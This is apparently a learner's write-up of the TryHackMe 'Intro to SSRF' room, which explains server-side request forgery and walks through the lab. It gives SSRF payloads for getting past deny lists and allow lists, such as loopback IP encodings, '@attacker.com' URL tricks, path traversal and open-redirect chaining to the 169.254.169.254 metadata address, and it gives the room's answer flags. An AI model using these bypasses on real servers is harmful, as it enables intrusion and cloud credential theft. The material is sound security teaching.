<h1 align="center"> Intro to SSRF </h1>



---


### Lab RooM:




---




## Task 1: SSRF Introduction

### What is SSRF?

**SSRF (Server-Side Request Forgery)** is a vulnerability where an attacker tricks a web server into making an HTTP request to a destination chosen by the attacker.

<img width="600" height="700" alt="image" src="https://github.com/user-attachments/assets/cf5b8535-a688-40b4-8c7c-56e865cd5cfb" />



The important point is that **the request comes from the server**, not directly from the attacker's browser.


#### Example

Imagine an application has:
````
/image?url=https://example.com/image.jpg
````
The server fetches whatever URL is supplied.

An attacker might try to make the server request an internal service:
````
/image?url=http://internal-service/
````
The server may be able to access something that the attacker cannot access directly.


### Types of SSRF
| Type             | Response Visible? | Description                                                                                                                             |
| ---------------- | ----------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Regular SSRF** | **Yes**           | The server makes the request and returns the response to the attacker. The attacker can directly read the result.                       |
| **Blind SSRF**   | **No**            | The server makes the request, but the response isn't returned. The attacker needs an indirect way to confirm that the request happened. |



#### Regular SSRF

<img width="600" height="700" alt="image" src="https://github.com/user-attachments/assets/6f332b78-4f50-4502-b0b6-6fea463cf287" />

We can directly inspect the returned content.


#### Blind SSRF

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/40c928de-58af-4b65-9a6e-52d467e63bb2" />


The response isn't shown to us.

We therefore need an indirect signal, such as a callback to a server we control, to determine whether the request happened.


### SSRF Impact
| Impact                              | Short explanation                                                                                                                 |
| ----------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| **Access to internal endpoints**    | The server may reach internal admin panels, configuration pages, and monitoring systems that aren't publicly accessible.          |
| **Sensitive data exposure**         | Internal APIs, databases, or services may return private company or customer information.                                         |
| **Internal network reconnaissance** | An attacker may discover internal hosts and services by observing responses, errors, or timing.                                   |
| **Cloud metadata theft**            | SSRF may allow access to cloud metadata such as `169.254.169.254`, potentially exposing temporary credentials or IAM information. |
| **Credential/token leakage**        | Internal requests may expose authentication tokens or secrets, especially when internal communication is poorly protected.        |


---


### Questions & Answers

#### 1. What does SSRF stand for?
````
Server-Side Request Forgery
````
<img width="1449" height="123" alt="image" src="https://github.com/user-attachments/assets/ee110912-831d-48b3-b28d-5893ae2911a9" />


---



#### 2. As opposed to a regular SSRF, what is the other type?
````
Blind
````
<img width="1447" height="117" alt="image" src="https://github.com/user-attachments/assets/a5cb2f15-34bd-492e-a918-754f41666faf" />

----


## Task 2: SSRF Examples

<img width="972" height="118" alt="image" src="https://github.com/user-attachments/assets/ea96f55b-4ef3-42a2-a246-8fbfe48bd5df" />


Now we see this, and just click on `Next`:
<img width="972" height="452" alt="image" src="https://github.com/user-attachments/assets/040b69f2-a752-44e2-84f5-2c6b9170fab3" />


>  We're going to take you through some sample SSRF attacks and explain how they work. At the end of the examples, you'll have to figure one out for yourself! 


<img width="970" height="692" alt="image" src="https://github.com/user-attachments/assets/8ecdb494-e77a-4442-92ca-98b7cb6959da" />


<img width="771" height="486" alt="image" src="https://github.com/user-attachments/assets/4578001c-1237-4083-93cd-1c538f2111fc" />

> The below example shows how the attacker can have complete control over the page requested by the webserver.
> The Expected Request is what the website.thm server is expecting to receive, with the section in red being the URL that the website will fetch for the information.
> The attacker can modify the area in red to an URL of their choice. 


<img width="968" height="640" alt="image" src="https://github.com/user-attachments/assets/7ef7db25-e1ee-4cee-88ca-00daca309523" />

The below example shows how an attacker can still reach the /api/user page with only having control over the path by utilising directory traversal. When website.thm receives ../ this is a message to move up a directory which removes the /stock portion of the request and turns the final request into /api/user 

<img width="771" height="486" alt="image" src="https://github.com/user-attachments/assets/01d0060a-b1b0-4264-9470-b86a0b46439d" />



<img width="968" height="743" alt="image" src="https://github.com/user-attachments/assets/8c67c6c2-94cb-41bd-b288-1d4dcbec16b8" />

>  In this example, the attacker can control the server's subdomain to which the request is made. Take note of the payload ending in ``&x=`` being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string. 

<img width="771" height="486" alt="image" src="https://github.com/user-attachments/assets/724eaf3a-f901-42e6-a9f5-82b41fa1e51f" />


<img width="966" height="709" alt="image" src="https://github.com/user-attachments/assets/03a7ef48-0641-43fe-93d3-f71cb8d7ddb1" />

>  Going back to the original request, the attacker can instead force the webserver to request a server of the attacker's choice. By doing so, we can capture request headers that are sent to the attacker's specified domain. These headers could contain authentication credentials or API keys sent by website.thm (that would normally authenticate to api.website.thm). 

<img width="771" height="486" alt="image" src="https://github.com/user-attachments/assets/caec16c9-c336-4b4d-8931-dc0ffed8928a" />





### 1. Full URL in a parameter

````
https://website.thm/item/2?server=api
````

The application internally creates:
````
https://server.website.thm/api/item?id=2
````
The important point is:
````
server=api
      ↑
user-controlled
````
If you can control this value, you can try changing the destination.


##### Example from the lesson
````
server=server.website.thm/flag?id=9&x=
````

The application may construct something like:
````
https://server.website.thm/flag?id=9&x=/api/item?id=2
````
The ``&x=`` is used so the application's original parameters are treated as another query parameter rather than changing our intended ``id=9``.






### 2. Partial URL / hostname

Sometimes the application does not accept a complete URL.

For example:
````
https://website.thm/stock?server=api.internal
````
The backend builds:
````
https://api.internal/stock/item
````
We can test whether the hostname is actually controlled:
````
https://website.thm/stock?server=attacker.com
````
If our server receives a request, we have evidence that the backend is making the request to our supplied host.



### 3. Path traversal in the URL

The application might normally request:
````
https://website.thm/stock?url=/item/123/details
````
The backend expects:
````
/item/123/details
````
But if the application doesn't properly normalize the path,:
````
../admin
````
can change the requested location.

Conceptually:
````
/item/123/../admin
          ↓
/admin
````
So the server may request:
````
https://website.thm/admin
````




### 4. Hidden form fields

SSRF input isn't always visible in the URL.

The HTML might contain:
````
<input type="hidden"
       name="avatar"
       value="/images/avatars/default.png">
````
The browser hides this field from the normal page, but the server still receives it.

We can inspect it with by just press `F12` or we can `View Source`.


We can also intercept the request with Burp Suite and change the value.

For example:
````
avatar=/images/avatars/default.png
````
could potentially be changed to another URL/path if the server doesn't validate it.



### Try It Yourself

Manipulate the ``server`` parameter so the backend fetches ``/flag?id=9``.

We start:
````
https://website.thm/item/2?server=api
````
We goal is to make the backend request:
````
https://server.website.thm/flag?id=9
````

In this we see:
````
https://website.thm/item/2?server=api
````

<img width="964" height="575" alt="image" src="https://github.com/user-attachments/assets/b44cf5dc-7c87-4cef-9d71-af5c010785af" />


````
?server=server.website.thm/flag?id=9&x=
````

change the ``server`` parameter to:
````
server=server.website.thm/flag?id=9&x=
````

Now we got full:
````
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
````
<img width="957" height="657" alt="image" src="https://github.com/user-attachments/assets/57ac80ad-805e-4873-a2ce-dae848ba976b" />


Now we got succeed.

> ``&x=`` is used to neutralize the application's extra parameters.
---


### Summary:

| Technique          | What you control     | Main idea                                                            |
| ------------------ | -------------------- | -------------------------------------------------------------------- |
| Full URL           | Complete destination | Change where the server requests                                     |
| Partial URL        | Host/path            | Control part of the destination                                      |
| Path traversal     | URL path             | Use `../` to reach another path                                      |
| Hidden field       | HTML form value      | Modify an invisible server-side request input                        |
| Query manipulation | Parameters           | Use `&`/query parameters to control how the final URL is constructed |

---

### Question & Answer:

#### 1. What is the flag from the SSRF Examples site?

````
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
````
<img width="957" height="611" alt="image" src="https://github.com/user-attachments/assets/a743b731-852d-44e0-92bd-6dc677378a83" />


##### Flag:
````
THM{SSRF_MASTER}
````
<img width="1338" height="173" alt="image" src="https://github.com/user-attachments/assets/fa89890d-ea89-4528-b5ab-8819475b9a7a" />


----



## Task 3: Finding an SSRF

### Common Indicators


#### What is SSRF?
**Server-Side Request Forgery (SSRF)** happens when a web application makes requests to other servers based on user-supplied input. If the application doesn't properly validate that input, attackers can trick the server into making requests to internal systems, cloud metadata endpoints, or other unintended destinations.


#### Common Patterns That Signal SSRF
These patterns are strong indicators that an application might be vulnerable to SSRF. When you see them during testing, it's worth investigating further.


#### 1. Full URL in a parameter

When a complete URL appears as a query parameter in the address bar, the application is almost certainly using it to make a server-side request.

Example:
````
https://website.thm/form?server=http://server.website.thm/store
````
Here, the server parameter contains a full URL. The application likely fetches something from that URL. If you change it to a different URL (like ``http://localhost`` or ``http://169.254.169.254/``), the server might fetch from that location instead — potentially exposing internal resources.



#### 2. Hidden form fields

Hidden form fields aren't visible on the rendered page, but they exist in the HTML source code. Their values control what the server fetches.

Example:

````html
<form method="post" action="/form">
    <input type="hidden" name="server" value="http://server.website.thm/store">
</form>
````
We can find these by:

Viewing the page source (Ctrl+U or right-click → View Page Source)

Intercepting requests with a proxy (like Burp Suite)




#### 3. Partial URL (hostname only)

The application accepts just a hostname and constructs the full URL on the server side.

Example:
````
https://website.thm/form?server=api
````
The server might take this value and build something like:
````
http://api.website.thm/data
````
By changing the hostname to something else (like ``localhost`` or ``internal-server``), we might be able to redirect the server's request.



#### 4. Path only

Only the path portion of the URL is user-controlled. The application prepends the scheme and hostname automatically.

Example:
````
https://website.thm/form?ds=/forms/contact
````

The server might construct:
````
https://api.website.thm/forms/contact
````
Changing the path might let you access other endpoints on the same server — like ``/admin`` or ``/internal/status`` — that aren't normally accessible from the outside.


#### Common Application Features That Contain SSRF Vectors

| Feature                   | Why It's Relevant                                                |
| ------------------------- | ---------------------------------------------------------------- |
| **Webhook configuration** | The application sends a request to a URL provided by the user.   |
| **PDF/report generation** | The server fetches content from a supplied URL.                  |
| **URL preview/unfurling** | The application retrieves information from a user-provided link. |
| **File import by URL**    | The server downloads a file from a user-specified location.      |
| **Integration settings**  | The server connects to third-party service URLs.                 |


### Confirming Blind SSRF

| Method                    | How It Works                                                                 |
| ------------------------- | ---------------------------------------------------------------------------- |
| **External HTTP Logger**  | Give the logger URL as the SSRF destination and check for incoming requests. |
| **Burp Collaborator**     | Provides a unique URL and detects HTTP/DNS callbacks.                        |
| **Self-hosted Listener**  | Run a simple HTTP server and watch for incoming connections.                 |
| **Timing Analysis**       | Compare response times between reachable and unreachable hosts.              |
| **Error-based Inference** | Compare different errors to determine whether a host is reachable.           |


---

### Question & Answer

#### 1. Based on simple observation, which of the following URLs is more likely to be vulnerable to SSRF?
1. https://website.thm/index.php
2. https://website.thm/list-products.php?categoryId=5325
3. https://website.thm/fetch-file.php?fname=242533.pdf&srv=filestorage.cloud.thm&port=8001
4. https://website.thm/buy-item.php?itemId=213&price=100&q=2

Now in this we see number `3` has SSRF:
````
3
````
<img width="1683" height="355" alt="image" src="https://github.com/user-attachments/assets/3852a50d-8095-420b-bbb1-5b6def892c1e" />


----


## Task 4: Defeating Common SSRF Defenses

### Deny Lists

A **deny list** blocks specific destinations, such as ``localhost`` or ``127.0.0.1``, while allowing other destinations.

The problem is that the same IP can have different representations.
| Representation | Value                       | Meaning                                                                  |
| -------------- | --------------------------- | ------------------------------------------------------------------------ |
| **Standard**   | `127.0.0.1`                 | Normal IPv4 loopback address                                             |
| **Decimal**    | `2130706433`                | Alternative numeric representation of `127.0.0.1`                        |
| **Octal**      | `017700000001`              | Octal representation of the same address                                 |
| **Shorthand**  | `127.1` / `127` / `0.0.0.0` | Alternative/short forms that may resolve locally depending on the parser |
| **Wildcard**   | `127.*.*.*`                 | Pattern representing the `127.x.x.x` range                               |
| **IPv6**       | `[::1]`                     | IPv6 loopback address                                                    |
| **DNS-based**  | `127.0.0.1.nip.io`          | Hostname that resolves to `127.0.0.1`                                    |


Deny list checks:
````
        "127.0.0.1"  → BLOCK
````

But the same destination may be represented as:
````
        2130706433
        017700000001
        [::1]
        127.0.0.1.nip.io
              ↓
        Loopback / localhost
````

So, a weak deny list may block only one representation while allowing another.

#### Deny Lists
````
169.254.169.254
````
This is commonly used for cloud instance metadata services. A poorly designed hostname-based deny list can fail to recognize that a user-controlled hostname ultimately resolves to this address.




### Allow Lists

An **allow list** blocks everything by default and only allows approved destinations.

| Bypass Technique         | Example                                   | Why It Works                                                                                        |
| ------------------------ | ----------------------------------------- | --------------------------------------------------------------------------------------------------- |
| **Subdomain matching**   | `https://website.thm.attacker-domain.thm` | The URL starts with `https://website.thm`, but the **real hostname** is controlled by the attacker. |
| **URL credential abuse** | `https://website.thm@attacker.com/`       | Everything before `@` can be treated as credentials; the actual hostname is **`attacker.com`**.     |


#### Flow:

Weak validation:
````
"Does the URL START with website.thm?"
              ↓
           YES → Allow
````

But proper parsing:
````
https://website.thm@attacker.com/
                  ↑
            Actual hostname
````


### Open Redirects

An **open redirect** is a URL on a website that automatically redirects the user to another URL supplied in a parameter.

| Step | URL / Action                                         | What happens                        |
| ---- | ---------------------------------------------------- | ----------------------------------- |
| 1    | `https://website.thm/link?url=https://tryhackme.com` | Website receives the URL            |
| 2    | Server processes `url=`                              | It follows the supplied destination |
| 3    | User is redirected                                   | Browser goes to `tryhackme.com`     |


#### SSRF + Open Redirect

The important idea is chaining two behaviors:
````
SSRF protection
      ↓
Only allows URLs beginning with
https://website.thm/
      ↓
Open Redirect
      ↓
Redirects to another destination
      ↓
Internal service
````

Example:
````
https://website.thm/link?url=http://169.254.169.254/latest/meta-data/
````
The allow-list sees the trusted ``website.thm`` URL first, but the redirect causes the server to request the final destination.



---


### Questions & Answers:

#### 1. What method can be used to bypass strict rules?
````
Open Redirects
````
<img width="1679" height="141" alt="image" src="https://github.com/user-attachments/assets/86edefc0-3fbe-4e56-a70a-b1140caf15ff" />


---

#### 2. What IP address may contain sensitive data in a cloud environment?
````
169.254.169.254
````
<img width="1697" height="154" alt="image" src="https://github.com/user-attachments/assets/9e515481-eefd-4b6b-b829-97fee6272746" />


---


#### 3. What type of list is used to permit only certain input?
````
Allow List
````
<img width="1677" height="135" alt="image" src="https://github.com/user-attachments/assets/cbf79652-7c3f-4b20-b81b-5742df68f603" />


---


#### 4. What type of list is used to stop certain input?
````
Deny Lists
````

<img width="1678" height="146" alt="image" src="https://github.com/user-attachments/assets/7dbd0720-4be7-471c-8851-c3bc16b68312" />


----


## SSRF Practical

### Connect machine:
<img width="977" height="302" alt="image" src="https://github.com/user-attachments/assets/47b14004-d1e8-4335-8137-1ea0db364fa2" />


Now my target is:
````
10.48.138.75
````
<img width="972" height="203" alt="image" src="https://github.com/user-attachments/assets/919a93e4-91d6-4b6b-a92d-2a87b940a178" />


### Scenario - SSRF Lab

This task is showing an SSRF through a hidden avatar field.
| Item                          | Meaning                                                             |
| ----------------------------- | ------------------------------------------------------------------- |
| `/private`                    | Restricted endpoint; normally cannot be accessed from your IP       |
| `/customers/new-account-page` | Customer page containing the avatar feature                         |
| **Target**                    | `/private`                                                          |
| **Attack vector**             | Avatar `value` field                                                |
| **Why avatar matters**        | The server uses the supplied avatar path to fetch an image/resource |


Click the Start Lab Machine button to launch the Acme IT Support website. Once running, visit it at ``https://10-48-138-75.reverse-proxy.cell-prod-ap-south-1a.vm.tryhackme.com`` and follow the steps below.

Go to:
````
https://10-48-138-75.reverse-proxy.cell-prod-ap-south-1a.vm.tryhackme.com
````
<img width="1855" height="945" alt="image" src="https://github.com/user-attachments/assets/3ce04c05-323e-40b9-9dfa-1433b265f42e" />



---

### Step 1: Locate the Avatar Feature

First go to:
````
https://10-48-138-75.reverse-proxy.cell-prod-ap-south-1a.vm.tryhackme.com/customers/login
````
<img width="1857" height="918" alt="image" src="https://github.com/user-attachments/assets/e08d6b2c-b6a1-496e-9086-c86cd0b2c9ce" />


In this I want to create this user:
- Username: `Helo`
- Email Address: `helo@email.com`
- Password: `helo123`
- Confirm Password: `helo123`
<img width="1435" height="865" alt="image" src="https://github.com/user-attachments/assets/7f59ed28-d76a-4836-8671-9845968088a2" />


Now we stay in our new user:
<img width="1439" height="698" alt="image" src="https://github.com/user-attachments/assets/3c778d37-ff10-4dcf-aa09-f59ab0d21270" />



Then go to `Your Account`:


Or we can go to:
````
https://10-48-138-75.reverse-proxy.cell-prod-ap-south-1a.vm.tryhackme.com/customers/new-account-page
````
<img width="1137" height="1023" alt="image" src="https://github.com/user-attachments/assets/5d36e887-21f5-42eb-a6ad-d24355d97750" />


Now we see this.

And then View Source:

``Right-click`` the page and select ``View Page Source`` (or press ``Ctrl + U``):

<img width="1865" height="1012" alt="image" src="https://github.com/user-attachments/assets/3cfe3325-49af-4c60-a78f-b5c8354a1949" />

````
<input type="radio"
       name="avatar"
       value="assets/avatars/1.png">
````
The important part is:
````
value="assets/avatars/1.png"
````

#### Why is this important?

Normally:
````
avatar value
     ↓
assets/avatars/1.png
     ↓
server fetches the image
````
The lab is testing whether we can change that server-side resource request.

So the key thing to remember is:

> The ``value`` attribute controls which resource the server fetches, making it the SSRF attack point in this lab.



### Step 2: Observe How the Server Handles the Request

Select one of the avatars and click ``Update Avatar``. The page updates to display the selected avatar:

<img width="1132" height="965" alt="image" src="https://github.com/user-attachments/assets/5aa62bc6-5019-4610-911d-1d7c797f40c3" />



<img width="1130" height="1025" alt="image" src="https://github.com/user-attachments/assets/06d4b070-efc5-4b13-b728-dd7233d42f89" />

Press `Ctrl + U`:

Inspect the page source again. The avatar is now rendered using the data URI scheme, with the image content base64-encoded in the ``src`` attribute:

<img width="1860" height="971" alt="image" src="https://github.com/user-attachments/assets/24ec551a-8ca8-447c-89dd-5c829b15c7a1" />



| Part                        | Meaning                                                                              |
| --------------------------- | ------------------------------------------------------------------------------------ |
| `data:image/png;base64,...` | The image is embedded directly in the HTML instead of using a normal image URL       |
| `base64`                    | The server converted the fetched content into Base64 text                            |
| `src` / `background-image`  | Where the browser gets the displayed image/data                                      |
| Server fetches resource     | The server requests whatever path was supplied in the avatar field                   |
| `/private`                  | The lab's protected endpoint                                                         |
| Base64 output               | If the server fetches `/private`, its response can appear encoded in the page source |


### Step 3: Attempt Direct Access to /private

1. ``Right-click`` one of the avatar radio buttons and select ``Inspect`` (Or just press `F12`):

<img width="1146" height="1022" alt="image" src="https://github.com/user-attachments/assets/db26b87d-a9dc-4699-b4ce-8b354b948fce" />


Then search:
````
.avatar-image
````

<img width="1859" height="958" alt="image" src="https://github.com/user-attachments/assets/366b7396-6211-49a5-b0da-59d8cdd2ce59" />


2. Change the ``value`` attribute from the image path to ``private``, just double click on `assets/avatars/5.png` then past:
````
private
````
<img width="1918" height="981" alt="image" src="https://github.com/user-attachments/assets/c0e04070-8798-41d4-a0d6-0e4a8e89768f" />


3. Select the modified radio button and click ``Update Avatar``:
<img width="1918" height="965" alt="image" src="https://github.com/user-attachments/assets/b750bb2f-9e1c-4585-af96-ca826efe81d1" />


Now we see it error:
<img width="1918" height="998" alt="image" src="https://github.com/user-attachments/assets/d1408886-4530-4396-8495-4e3968fa86da" />


> **Note**: In this we need to use in the first of image.


### Step 4: Bypass the Deny List

Change the radio button's ``value`` attribute to:
````
x/../private
````
<img width="1918" height="996" alt="image" src="https://github.com/user-attachments/assets/ed63beaf-a70d-480e-ab90-f2864edb0331" />


<img width="1917" height="982" alt="image" src="https://github.com/user-attachments/assets/4980d137-c36f-4794-abd1-7a0a534b073e" />


Now we see this:
<img width="1919" height="972" alt="image" src="https://github.com/user-attachments/assets/ac336e36-3dc5-4aee-9023-23bf480da949" />






### Step 5: Decode the Flag

Then copy this string:
````
VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ==
````

Then go to: https://gchq.github.io/CyberChef/

And past our string:
````
VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ==
````
<img width="1921" height="1025" alt="image" src="https://github.com/user-attachments/assets/0d8f3351-3cb3-455a-ba23-6e04eba3847e" />



Or we can use this:
````
echo "VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ==" | base64 -d
````
<img width="845" height="141" alt="image" src="https://github.com/user-attachments/assets/c4f20b93-aeb7-4ad3-9198-33377c6b792e" />



---


### Question & Answer:

#### 1. What is the flag from the /private directory?

NBase on we do above flag is:

````
THM{YOU_WORKED_OUT_THE_SSRF}
````

<img width="1435" height="194" alt="image" src="https://github.com/user-attachments/assets/20eb4e59-ddff-453b-9e94-553486214763" />




----


### Now we complete the RooM:

<img width="1309" height="754" alt="image" src="https://github.com/user-attachments/assets/310a786f-8727-4213-b180-ed001b350c53" />





----
